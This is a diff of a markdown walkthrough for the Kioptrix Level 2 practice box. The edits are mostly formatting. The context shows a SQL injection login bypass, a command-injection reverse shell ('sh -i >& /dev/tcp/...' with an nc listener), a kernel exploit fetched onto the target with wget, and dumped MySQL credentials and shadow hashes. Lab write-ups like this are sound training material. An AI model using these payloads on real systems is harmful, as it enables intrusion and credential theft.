@@ -13,7 +13,8 @@ Here's a quick guide to setting up a DHCP server in the Kali attacker directed a
 ### DHCP Setup
 1. Install isc-dhcp-server: `sudo apt install isc-dhcp-server -y`
 2. Configure the DHCP server: <br>
-Delete everything and replace it with:
+Delete everything and replace it with: <br>
+
 ```
 default-lease-time 600; 
 max-lease-time 7200; 
@@ -30,7 +31,8 @@ subnet 10.0.1.0 netmask 255.255.255.0 {
 - `sudo nano /etc/default/isc-dhcp-server`
 - Find `INTERFACESv4=""` and change it to: `INTERFACESv4="eth2"`
 
-4. Start and Enable the Service:
+4. Start and Enable the Service: <br>
+
 ```bash
 sudo systemctl start isc-dhcp-server
 sudo systemctl enable isc-dhcp-server
@@ -39,7 +41,8 @@ sudo systemctl status isc-dhcp-server
 ```
 
 5. Find IP address of vulnerable machine <br>
-Use any of the following commands:
+Use any of the following commands: <br>
+
 ```bash
 nmap -sn 10.0.1.0/24
 sudo arp-scan --interface=eth2 --localnet
@@ -65,6 +68,7 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 2.060 seconds (124.27 hosts/sec). 1
 ```
 
 Let's continue our enumeration with nmap.
+
 ```bash
 ┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl2]
 └─$ nmap 10.0.1.101 -sV
@@ -91,6 +95,7 @@ Let's check the web application running on port 80. <br>
 
 This looks like a barebones login system, it should be easy to break into it. I tried default credentials for common services (admin, root, guest, etc.) but they didn't work. <br>
 Looking at the source code of the page with CTRL+U, we can find something interesting on line 28:
+
 ```html
 <!-- Start of HTML when logged in as Administator -->
 ```
@@ -102,7 +107,8 @@ There might be an 'admin' or 'Administrator' user in the system. Let's keep usin
 Going back at our nmap scans, we can see a MySQL service running in port 3306. We could try getting access to the system through SQLi.
 
 I researched common payloads for MySQL systems and I found something userful on PayloadsAllTheThings: (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-testing-injection">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-testing-injection</a>). <br>
-I tried using the injections in the Login section with these creds `admin / ' OR 1 -- -`. Now, we submit our payload... <br>
+I tried using the injections in the Login section with these creds `admin / ' OR 1 -- -`. <br>
+Now, we submit our payload... <br>
 <img width="622" height="187" alt="image" src="https://github.com/user-attachments/assets/4a4eecf3-8b34-46bd-9f75-168f22b19ea9" />
 
 We have access to the portal!
@@ -115,7 +121,8 @@ This looks like the output of the `ping` command. I wonder if we can execute any
 Let's try `; whoami`. <br>
 <img width="535" height="204" alt="image" src="https://github.com/user-attachments/assets/59e517b9-263a-4db9-b5a0-6b78f0a5321f" />
 
-We have command injection! Let's start a reverse shell back to our machine.
+We have command injection! Let's start a reverse shell back to our machine. <br>
+
 ```bash
 # on kali
 nc -lvnp 7777
@@ -123,6 +130,7 @@ nc -lvnp 7777
 # type this in the web application
 ; sh -i >& /dev/tcp/10.0.0.5/7777 0>&1
 ```
+
 <br>
 <img width="456" height="149" alt="image" src="https://github.com/user-attachments/assets/57ba2584-2145-4255-a3f6-5e1029e85e22" />
 
@@ -132,6 +140,7 @@ We have **user** access!
 I used two different methods to obtain root access: running a public kernel exploit from Google and using the LinPEAS script.
 
 ### Kernel Public Exploit
+
 ```bash
 sh-3.00$ uname -r
 2.6.9-55.EL
@@ -140,7 +149,8 @@ sh-3.00$ uname -r
 Looking up "linux kernel 2.6.9-55.EL exploit db" on Google will return many public exploits for the version of the Linux kernel. <br>
 Let's use the first result: <a href="https://www.exploit-db.com/exploits/9542">https://www.exploit-db.com/exploits/9542</a>
 
-Let's download that exploit on our Kali machine and transfer it to the machine to get root.
+Let's download that exploit on our Kali machine and transfer it to the machine to get root. <br>
+
 ```bash
 # on kali
 ┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl2]
@@ -193,6 +203,8 @@ gunzip 9435.tgz
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 10.0.1.101 - - [27/Mar/2026 21:34:02] "GET /9435.tar HTTP/1.0" 200 
 ```
+<br>
+
 ```bash
 # on victim
 sh-3.00$ wget http://10.0.1.5:8080/9435.tar
@@ -241,6 +253,7 @@ sh-3.00$ head index.php
 ```
 
 Let's connect to the MySQL service on the machine.
+
 ```bash
 sh-3.00$ mysql -h localhost -u john -p
 Enter password: hiroshima
@@ -272,6 +285,7 @@ sh-3.00$
 ```
 
 Anyways, here's the whole database used in `webapp`.
+
 ```bash
 sh-3.00$ mysql -u john -h localhost -phiroshima
 \u webapp
@@ -288,6 +302,7 @@ These creds DO work with the webapp, which is neat.
 Logging in with `admin` creds displays the ping utility we used to get User Access. Using the `john` creds leads to an empty screen.
 
 Here's the `/etc/shadow` hashes. I was also unable to crack them with rockyou.txt.
+
 ```bash
 root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
 john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
@@ -295,6 +310,7 @@ harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
 ```
 
 `/var/mail/root` didn't really show anything interesting, just some automated log thing with LogWatch:
+
 ```bash
 ------------------ Disk Space --------------------
 
